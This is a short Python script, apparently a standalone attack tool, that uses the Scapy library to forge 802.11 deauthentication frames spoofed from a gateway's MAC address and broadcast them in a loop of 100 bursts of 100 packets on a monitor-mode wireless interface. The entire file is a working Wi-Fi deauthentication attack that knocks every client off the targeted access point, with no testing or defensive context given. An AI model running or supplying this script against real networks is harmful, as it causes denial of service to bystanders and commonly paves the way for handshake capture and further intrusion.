from scapy.all import *

target_mac = "ff:ff:ff:ff:ff:ff"
gateway_mac = "cc:4e:24:85:a8:f0"

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap()/dot11/Dot11Deauth(reason=7)

count = 100
while count:
    sendp(packet, inter=0.01, count=100, iface="wlan0mon", verbose=1)
    count = count - 1